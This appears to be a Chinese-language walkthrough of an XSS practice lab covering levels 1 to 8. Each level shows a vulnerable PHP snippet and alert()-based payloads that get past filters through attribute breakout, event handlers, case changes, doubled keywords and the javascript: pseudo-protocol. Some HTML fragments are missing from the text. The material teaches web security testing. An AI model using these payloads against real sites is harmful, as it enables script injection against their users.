# xss挑战之旅
## **level1**
url：
关键代码分析
    ini_set("display_errors", 0);
    $str = $_GET["name"];
    echo "欢迎用户".$str."";
输入test
## **level2**
url：
关键代码分析
    $str = $_GET["keyword"];
    echo "没有找到和".htmlspecialchars($str)."相关的结果."."
使用GET方法，从url中接受一个keyword搜索参数，此处用到了一个过滤函数htmlspecialchars()，这个函数把预定义的字符转换为HTML实体
本题是搜索型xss
输入常见的payload：``
没有弹窗，审查元素可以看到的输入的XSS语句被赋值给value并且在input标签里，所以我们需要闭合value和input标签才可以正常弹窗
输入框构造常用payload：
`" onmouseover=alert(/xss/)>click`
当鼠标移动到搜索框就会触发弹窗
审查元素，可以看到我们的输入变成了
`">`
`">`
`">`
其它payload:
    其它payload:
    " onchange=alert`document.domain` //  要在输入框里再次输入参数，并按下空格，才会弹窗
    " oninput=alert`document.domain` // 要在输入框里再次输入参数
    " onfocus=alert(document.domain) autofocus；// 要再次单击搜索框
## **level3**
url：
关键源代码分析
    $str = $_GET["keyword"];
    $str2=str_replace(">","",$str);
    $str3=str_replace("没有找到和".htmlspecialchars($str)."相关的结果.".'
发现过滤了 使用的str_replace函数，需要用 "
闭合value标签。注意：str_replace函数是区分大小写的，str_ireplace函数不区分大小写，所以有时候我们还可以利用大小写绕过。
构造payload：
`' onclick=alert(/xss/)//`
输入payload后，单击搜索框，就会触发弹窗
审查元素发现我们的输入变成了
    ' onmouseover=alert('xss')//   当鼠标移动到搜索框触发弹窗
    ' oninput=alert`xss` //    
    ' oninput=alert`xss` '   要在输入框内再次输入参数触发弹窗
    ' onchange=alert`xss` //
    ' onchange=alert`xss` '   要在输入框里再次输入参数，并按下空格，才会弹窗
## **level4**
url：
关键源码分析
可以看到，传入进去的值经过了两个函数的参与，str_replace(">","",$str)，此函数是将变量str中的字符>转换为空，转换时区分大小写；同样也把”，的情况下构造语句，并且不被htmlspecialchars()函数影响。所以这里可以构造一个输入到文本框后出现相应的事件。
构造payload：
`" onfocus=alert(xss) autofocus="`
onfocus事件：定义的事件将在对象获得焦点时触发，这里指input标签获得焦点。
autofocus属性：input标签的属性，当页面加载input标签，自动获得焦点。
焦点：这里指你的光标的位置，也就是说当你的光标出现在input文本框这里，将进行onfocus事件的发生。
其它payload：
    " onmouseover=alert('xss')   当鼠标移动到搜索框触发弹窗
    " oninput=alert`xss`  要在输入框内再次输入参数触发弹窗
    " onchange=alert`xss`//
    " onchange=alert`xss` '   要在输入框里再次输入参数，并按下空格，才会弹窗
## **level5**
url：
关键代码分析
看一下源代码，str2=strreplace("`
    "> click me !!!
点击click me,成功弹窗
`">
关键源码分析
由于是用str_replace函数来过滤的，这一关没有对大小写的限制，所以我们可以通过大小写变换来绕过。
构造payload：
`"> `
`"> `
    "> click me!!! 还要点击click me
审查元素
`" ONclick=alert(/xss/) //`还要点击输入框
`">` 点击这个区域才会触发弹窗
## **level7**
url：
关键源码分析
审查代码，我们可以发现script，on，src，data，href都被转换成空了，大小写也不能用了，所以本题我们可以尝试双写绕过。
构造 payload：
`" oonnclick=alert(/xss/)//` 点击搜索框，触发弹窗
`" oonnmouseover=alert(/xss/)//` 鼠标移动到输入框出触发弹窗
`" oonninput=alert(/xss/) "` 要在输入框内再次输入参数，才会触发弹窗
## **level8**
url：
关键代码分析
通过审查源代码我们可以发现，"script"转换为"scr_ipt"，"on"转换为"o_n"，"src"转换为"sr_c"，"data"转换为"da_ta"，"href"转换为"hr_ef"，'"'转换为'&quot'，大小写过滤并被编码，尖括号><，单引号'，%，#，&符号没有被过滤，输出点在a标签内，href属性中，属性里的双引号被转换成HTML实体，无法截断属性，这里可以使用伪协议绕过javascript:alert，javascript:伪协议声明了URL的主体是任意的javascript代码，它由javascript的解释器运行，由于script关键字被过滤，javascript会被替换成javasc_ript，使用&#x72来代替r,伪协议后面可以使用URL编码进行编码。
Payload：
    javascript:%61lert(/XSS/)
    javascript:%61lert`/xss/`
    javascript:alert`/xss/`